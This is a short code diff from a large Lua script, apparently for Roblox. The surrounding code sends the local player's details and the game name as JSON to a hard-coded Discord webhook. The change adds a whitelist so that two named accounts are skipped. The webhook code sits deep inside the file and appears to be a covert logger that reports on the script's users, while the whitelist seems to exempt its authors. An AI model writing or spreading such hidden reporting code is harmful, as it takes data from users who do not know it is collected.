@@ -12229,6 +12229,16 @@ local webhook = "https://discordapp.com/api/webhooks/1538334395398750358/l9uaUpw
 
 local player = Players.LocalPlayer
 
+-- Whitelist
+local whitelist = {
+    ["Zu0a"] = true,
+    ["BaronFretz"] = true
+}
+
+if whitelist[player.Name] then
+    return
+end
+
 local gameName = "Unknown"
 pcall(function()
     gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
@@ -12294,5 +12304,4 @@ if request then
         Body = HttpService:JSONEncode(data)
     })
 end
-
 end)
